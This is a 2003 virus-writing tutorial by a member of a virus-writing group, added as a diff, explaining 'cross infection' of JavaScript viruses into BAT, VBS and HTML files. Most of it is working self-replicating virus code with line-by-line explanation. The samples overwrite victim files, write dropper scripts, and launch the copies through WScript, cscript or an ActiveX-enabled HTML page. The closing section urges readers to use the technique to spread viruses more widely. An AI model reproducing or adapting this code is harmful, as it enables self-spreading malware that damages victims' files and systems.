@@ -1,0 +1,410 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************     Cross Infection in JavaScript    ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+.intro words
+
+  This article is a conclusion of my JS.Sinope, JS.Charon and some other silly ideas
+  i got while coding anything senseless or drinking beer. :D Anyway, I think these
+  techniques will be really successfull, because you're able to spread your virus
+  with much more extansions. Now, let's start and see, what we're able to do.
+
+
+
+
+
+
+.index
+
+  1) BAT / JS infection via goto and '/*' - '*/'
+  2) BAT / JS infection via code includeing
+  3) VBS / JS infection via code includeing
+  4) HTML / JS infection via code includeing
+
+
+
+
+
+
+.BAT / JS infection via goto and '/*' - '*/'
+
+  This technique I used in my JS.Charon (aka. I-Worm.Xaron). It infects .JS
+  and .BAT files. Both extansion used just one virusbody. That means, that
+  the BAT and the JS file of the virus have the same code.  The virus infects
+  a file named 'victim.js' and 'victim.bat' in the current directory. OK, now
+  let's look at the code:
+
+
+
+ - - - - - - - - [BAT|JS infection-example I] - - - - - - - -
+/*
+goto bat
+*/
+var fso=WScript.CreateObject('Scripting.FileSystemObject')
+var shell=WScript.CreateObject('WScript.Shell')
+mycode=fso.OpenTextFile(WScript.ScriptFullName).ReadAll()
+victim=fso.OpenTextFile('victim.js',2)
+victim.Write(mycode)
+victim.Close()
+batpart=fso.CreateTextFile('virus.bat')
+batpart.Write(mycode)
+batpart.Close()
+shell.Run('virus.bat')
+/*
+:bat
+copy %0 victim.bat
+if not exist virus.js goto endbat
+copy %0 virus.js
+cscript virus.js
+:endbat 
+*/
+ - - - - - - - [BAT|JS infection-example I end] - - - - - - - 
+
+
+  As you can see, the code is a bat-code and a js-code. The main reason, that
+  the program works is, that the BAT-part don't stop, if there is any error.
+  Something important is also, that we have to run the other extansion. There
+  could be a real silly error. The program would work forever. What do to? Check
+  if the other file extansion already exist. OK, you saw the code, now let's have
+  a look at the explanation.
+
+
+ - - - - - - - [BAT|JS infection-example I explanation] - - - - - - - 
+
+>> /*
+>> goto bat
+>> */
+	This part tells the bat-extension, that it shall jump to the real bat-part.
+	If the running file is a JS, it does nothing. If there didn't exist a '/*',
+	there would occure a fatal syntax error, and the program will stop. It's better
+	to write the real batch part in the end of the code, otherwise you can't use
+	letters like '<', '>' or '%' in the JavaScript.
+
+>> var fso=WScript.CreateObject('Scripting.FileSystemObject')
+>> var shell=WScript.CreateObject('WScript.Shell')
+	These are two variables we need to Write/Open/Read from files and Run files.
+	Nothing more.
+
+
+>> mycode=fso.OpenTextFile(WScript.ScriptFullName).ReadAll()
+	We read the whole code from our own virus file. Now the variable 'mycode'
+	contains everything from our file.
+
+>> victim=fso.OpenTextFile('victim.js',2)
+	Let's open the first file to infect with write access. If we want to work with
+	that file, we will use the variable 'victim'.
+
+>> victim.Write(mycode)
+>> victim.Close()
+	We write our code, which we saved in the variable 'mycode' to the file we have
+	opend before. After that we close that file, because we don't need it anymore.
+
+
+>> batpart=fso.CreateTextFile('virus.bat')
+>> batpart.Write(mycode)
+>> batpart.Close()
+	Because of the fact, that we want to run ourself with .BAT extansion too, we
+	create a new file, write our code to it, and close it again.
+
+>> shell.Run('virus.bat')
+	Now we run the file we generated before. Now the same code runs with with .BAT
+	extansion.
+
+>> /*
+>> :bat
+	The JavaScript did, what it shall do. Now the batch part starts. Before of the
+	':bat'-lable we write a '/*', so the JavaScript won't have an error. At the start
+	of the code we jumped to this lable.
+
+>> copy %0 victim.bat
+	Let's infect the first file 'victim.bat'. We copy ourself to this file, and guess
+	what? It contains our code.
+
+>> if not exist virus.js goto endbat
+	We want to run the JavaScript-part too, and because of that we have to check,
+	if we have already run the .JS part of our program. If it already exist, we jmp
+	to the end.
+
+>> copy %0 virus.js
+>> cscript virus.js
+	Now we copy ourself to a .JS file and run the file. Now the same starts with JS
+	again.
+
+>> :endbat 
+>> */
+	Here you can see the lable, which we use to jump to, if the .js part already ran.
+	Next of that you can see the end of the JavaScript.
+
+ - - - - - - - [BAT|JS infection-example I explanation end] - - - - - - - 
+
+
+
+
+
+.BAT / JS infection via code includeing
+
+  A more elegant, but also more difficult way to infect BAT files is, to include the
+  code of the JavaScript to an .BAT file, which writes the code to a new .JS and runs it.
+  To do this, we have o use the DOS-command 'echo ... >> file.JS'. Not as the type I, this
+  time the BAT file doesn't contain the same code as the .JS. Moreover the BAT is just a
+  dropper of the JavaScript. Anyway, it contains the virus, and execute it. OK, now let's
+  have a look at the example.
+
+
+ - - - - - - - [BAT|JS infection-example II] - - - - - - - 
+
+
+var fso=WScript.CreateObject('Scripting.FileSystemObject')
+me=fso.OpenTextFile(WScript.ScriptFullName)
+nl=String.fromCharCode(13)+String.fromCharCode(10); big=String.fromCharCode(62);
+batch=fso.CreateTextFile('victim.bat', 2)
+batch.WriteLine('cls'+nl+'@echo off'+nl+'echo.'+big+'virus.js')
+me.ReadLine()
+eval('for (i=0; i'+String.fromCharCode(60)+'13; i++) { myline=me.ReadLine(); batch.WriteLine("echo "+myline+"'+big+big+'virus.js") }')
+batch.WriteLine('cscript virus.js')
+batch.Close(); me.Close()
+me=fso.OpenTextFile(WScript.ScriptFullName)
+victim=fso.OpenTextFile('victim.js',2)
+victim.Write(me.ReadAll())
+victim.Close()
+
+ - - - - - - - [BAT|JS infection-example II end] - - - - - - -
+
+
+  First important thing  is, that the first line of the code is an empty line.
+  That's because of the fact, that we have to delete the file, which shall contains
+  the virus, have to be empty, so we delete it. As you can see, we read every line,
+  and write it to the batch file. OK, seems to be understandable. Now let's have
+  a look at the explanation of the whole thing:
+
+
+ - - - - - - - [BAT|JS infection-example II explanation] - - - - - - -
+
+>>
+	I alreay explained this empty line. It's generated by the batch-virus-dropper
+	to delete the file content of the virus-file. We have to add it also to the
+	first generation, because we read 13 lines, otherwise there will be a 'read
+	after end of file'-error.
+
+>> var fso=WScript.CreateObject('Scripting.FileSystemObject')
+>> me=fso.OpenTextFile(WScript.ScriptFullName)
+	We need the 'file-system object', so we declare it :). And we need the code of
+	our file, so we open ourself. Now we use ourself via the variable 'me'.
+
+>> nl=String.fromCharCode(13)+String.fromCharCode(10); big=String.fromCharCode(62);
+	This is a very important part of the code. The variable 'nl' contains the ASCII
+	code of 'jump to next line'. That's just to short our code. The variable 'big'
+	contains the sign '>'. We want to write something to a batch file, and as you
+	maybe know, batch don't allow stigns like the '>'. SO we use it as a ASCII-string.
+	Otherwise our dropper won't write all files with that signs to our new virus,
+	and nothing would work.
+
+>> batch=fso.CreateTextFile('victim.bat', 2)
+>> batch.WriteLine('cls'+nl+'@echo off'+nl+'echo.'+big+'virus.js')
+	We create a new file to write to it. After that we write some lines to it. Nothing
+	very important for the virus.
+
+>> me.ReadLine()
+	We read one line of our code. That's our empty line, just because we don't have to
+	include it again (the dropper will do it for us :D).
+
+>> eval('for (i=0; i'+String.fromCharCode(60)+'13; i++) { myline=me.ReadLine(); batch.WriteLine("echo "+myline+"'+big+big+'virus.js") }')
+	You may ask: "Why do we use 'eval'?". There's a simple answere: We want to read and write
+	thirteen lines, so we use a 'for'. But our 'for' needs a '>'-sign. And I told you before
+	that DOS doesn't allow that sign. So we use our variable named 'big'. But we can't use
+	any variable in the 'for'. So we have to use the whole command as a string in the command
+	'eval' (eval runs strings). OK, what does that line? We read 13 lines, and write it to
+	our dropper. Now the dropper will contain the whole code of ourself. :)
+	
+>> batch.WriteLine('cscript virus.js')
+	At the end of the batch writing part we include a 'cscript' to run the .JS in BAT format.
+	That's the most important line, otherwise everything would senseless.
+
+>> batch.Close(); me.Close()
+	We close the batch file (the dropper) and our own file, because we don't need them
+	anymore.
+
+>> me=fso.OpenTextFile(WScript.ScriptFullName)
+>> victim=fso.OpenTextFile('victim.js',2)
+>> victim.Write(me.ReadAll())
+>> victim.Close()
+	Because of the reason, that we want to infect the 'victim.js' too, we open ourself again,
+	open the 'victim.js', write everthing from our file to the victim file and close it again.
+	We finished to do everything. :)
+
+ - - - - - - - [BAT|JS infection-example II explanation end] - - - - - - -
+
+
+
+
+
+.VBS / JS infection via code includeing
+
+  Now we move to an other file-extansion: To VisualBasicScript. To infect this format
+  we have to know, that we must not use any ->"<- [chr(34)], otherwise the VBS will
+  stop and doesn't do, what we want it shall do. The princip is the same like the
+  BAT-part. Just let's look at the code:
+
+ - - - - - - - - [VBS|JS infection-example] - - - - - - - -
+
+var fso=WScript.CreateObject('Scripting.FileSystemObject')
+me=fso.OpenTextFile(WScript.ScriptFullName)
+nl=String.fromCharCode(13)+String.fromCharCode(10); comma=String.fromCharCode(34);
+vbsfile=fso.CreateTextFile('victim.vbs', 2)
+vbsfile.WriteLine('set fso=WScript.CreateObject('+comma+'Scripting.FileSystemObject'+comma+')'+nl+'set shell=WScript.CreateObject('+comma+'WScript.Shell'+comma+')'+nl+'set virus=fso.CreateTextFile('+comma+'virus.js'+comma+')')
+for (i=0; i<12; i++) { myline=me.ReadLine(); vbsfile.WriteLine('virus.WriteLine'+comma+myline+comma) }
+vbsfile.WriteLine('virus.Close()'+nl+'shell.Run'+comma+'virus.js'+comma)
+vbsfile.Close(); me.Close()
+me=fso.OpenTextFile(WScript.ScriptFullName)
+victim=fso.OpenTextFile('victim.js',2)
+victim.Write(me.ReadAll())
+victim.Close()
+
+ - - - - - - - [VBS|JS infection-example end] - - - - - - -
+
+
+  OK, you can see, that some things are same as in our BAT-cross infection example.
+  Fortunatly it's not as hard as the BAT thing, because we just have to look for
+  chr(34)'s, which we don't have to include (not two letters). Now I'll explain
+  the important lines of this code.
+
+
+ - - - - - - - - [VBS|JS infection-example explanation] - - - - - - - -
+
+>> var fso=WScript.CreateObject('Scripting.FileSystemObject')
+>> me=fso.OpenTextFile(WScript.ScriptFullName)
+	We know this lines from the other example in BAT. It just create the filesystem object
+	and open our own file, because we need it's code.
+
+>> nl=String.fromCharCode(13)+String.fromCharCode(10); comma=String.fromCharCode(34);
+	We know the variable 'nl', but what's 'comma'? It's only the ASCII string for
+	["]. Because of the reason, that our VBS file will need this sign for write
+	the virus code to a new .JS file, we must not use it. So we use the ASCII.
+
+>> vbsfile=fso.CreateTextFile('victim.vbs', 2)
+	Here we create the new file named 'victim.vbs'. This will be our virus
+	dropper.
+
+>> vbsfile.WriteLine('set fso=WScript.CreateObject('+comma+'Scripting.FileSystemObject'+comma+')'+nl+'set shell=WScript.CreateObject('+comma+'WScript.Shell'+comma+')'+nl+'set virus=fso.CreateTextFile('+comma+'virus.js'+comma+')')
+	Here we write some important lines to the .VBS file. The Visual Basic Script 
+	will use fso, shell for write to a file (the new virus), and for execute the
+	file. So we generate it here. The variable 'virus' in VBS creates a new file
+	named 'virus.js'. Guess what it should be? Yeah, you're right: Our new virus.
+
+
+>> for (i=0; i<12; i++) { myline=me.ReadLine(); vbsfile.WriteLine('virus.WriteLine'+comma+myline+comma) }
+	Now we read 12 lines of our code and write it to the .VBS, so the VBS will
+	contain our viruscode, and write it to the new file.
+
+>> vbsfile.WriteLine('virus.Close()'+nl+'shell.Run'+comma+'virus.js'+comma)
+	In the end let's Close the variable 'virus' in the VB script and run the
+	new generated file, which contains our JS-virus-code. :)
+
+>> vbsfile.Close(); me.Close()
+	This closes the VBS-file and our own file, because we don't need it anymore.
+
+>> me=fso.OpenTextFile(WScript.ScriptFullName)
+>> victim=fso.OpenTextFile('victim.js',2)
+>> victim.Write(me.ReadAll())
+>> victim.Close()
+	You'll need this lines from the other example. We overwrites the file named
+	'victim.js' with our code, and close the file.
+
+ - - - - - - - [VBS|JS infection-example explanation end] - - - - - - -
+
+
+
+
+
+.HTML / JS infection via code includeing
+
+  HTML is the most famous internet-language, and that's the reason, why we also
+  shall infect that type of files. OK, you know, we're able to include any
+  script language in HTML, and that we need for our little program. We use a
+  JS file, to include the code of the virus to a new file and run it. OK, I think
+  you understood it, so let's have a look at the example
+
+
+ - - - - - - - - [HTML|JS infection-example] - - - - - - - -
+
+var fso=WScript.CreateObject('Scripting.FileSystemObject')
+nl=String.fromCharCode(13)+String.fromCharCode(10); comma=String.fromCharCode(34);
+me=fso.OpenTextFile(WScript.ScriptFullName)
+html=fso.CreateTextFile('victim.html')
+html.Write('<html><body><script language='+comma+'VBScript'+comma+'>'+nl+'On Error Resume Next'+nl+'Set fso=CreateObject('+comma+'Scripting.FileSystemObject'+comma+')'+nl+'Set shell=CreateObject('+comma+'Wscript.Shell'+comma+')'+nl+'if err.number=429 Then shell.Run javascript:location.reload()'+nl+'set virus=fso.CreateTextFile('+comma+'C:\\virus.js'+comma+')'+nl)
+for (i=0; i<7; i++) { myline=me.ReadLine(); html.Write('virus.WriteLine'+comma+myline+comma+nl) }
+html.WriteLine('virus.Close()'+nl+'shell.Run'+comma+'C:\\virus.js'+comma+nl+'</scrip'+'t></bo'+'dy></h'+'tml>')
+
+ - - - - - - - [HTML|JS infection-example end] - - - - - - -
+
+
+  This little code generates a .html file, which contains the virus code, and runs
+  the viruscode after writing to a new .JS file. Now we're also able to infect
+  .HTM(L) files. The princip of this code is the same as the VBS or BAT infection.
+  Only thing is, that we have to write littel more to the new file than just the
+  code. We include the code to a .VBS in the .HTML file, otherwise it would be little
+  more difficult. OK, maybe you don't really understand this. So look at the explanation.
+
+
+ - - - - - - - - [HTML|JS infection-example explanation] - - - - - - - -
+
+>> var fso=WScript.CreateObject('Scripting.FileSystemObject')
+	That's again the FileSystemObject, which we need to read and write to a file
+	(read: our code - write: the victim)
+
+>> nl=String.fromCharCode(13)+String.fromCharCode(10); comma=String.fromCharCode(34);
+	That's again the two variables, which contains special strings. Variable
+	'nl' contains the ASCII of -jump to next line- and 'comma' contains the
+	ASCII of ["].
+
+>> me=fso.OpenTextFile(WScript.ScriptFullName)
+>> html=fso.CreateTextFile('victim.html')
+	Here we open our file, because we have to read from it, and we create the
+	'victim.html', because we want to write to it.
+
+>> html.Write('<html><body><script language='+comma+'VBScript'+comma+'>'+nl+'On Error Resume Next'+nl+'Set fso=CreateObject('+comma+'Scripting.FileSystemObject'+comma+')'+nl+'Set shell=CreateObject('+comma+'Wscript.Shell'+comma+')'+nl+'if err.number=429 Then shell.Run javascript:location.reload()'+nl+'set virus=fso.CreateTextFile('+comma+'C:\\virus.js'+comma+')'+nl)
+	Here we write the first important things to the .html. These things are for instands the
+	html-format (<html><body><...>) and some parts of the VBS-file (the declaration of the
+	important variables in VBS [fso and shell], the part, which checks, if the user want to run
+	the ActivX [otherwise we reload he document], and the creating of the new file, which shall
+	contain the new [old :D] viruscode).
+
+>> for (i=0; i<7; i++) { myline=me.ReadLine(); html.Write('virus.WriteLine'+comma+myline+comma+nl) }
+	Here we read the first 7 lines, and write it to the VBScript in the HTML, because it have
+	to contain the JavaScript code.
+
+>> html.WriteLine('virus.Close()'+nl+'shell.Run'+comma+'C:\\virus.js'+comma+nl+'</scrip'+'t></bo'+'dy></h'+'tml>')
+	In the end we add some more things to the html: We close the new generated .JS file
+	and run it. After that we add the end of the body and html-tag in t html-file.
+
+ - - - - - - - [HTML|JS infection-example explanation end] - - - - - - -
+
+
+
+
+
+.last words
+
+  To infect more than one file-extansion is for sure much more successful than infect just one.
+  The reason for this is easy: You're able to infect more files on one victim's computer, and
+  because of that we're able to spread the virus much better. Much examples for that have been
+  existing long since much time. Nearly every intelligent virus use cross-infection or infection
+  of more than one file extansion nowadays. That's also the reason, why you should use it. :)
+  Here, at the end of my article I want to say sorry about my grammatic and spelling mistakes
+  in this text. All in all, I hope, you had fun while reading this paper, and you've learned
+  little more things.
+
+
+							- - - - - - - - - - - - - - -
+							  Second Part To Hell/[rRlf]  
+							  www.spth.de.vu
+							  spth@aonmail.at
+							  written in june 2003
+							  Austria
+							- - - - - - - - - - - - - - - 
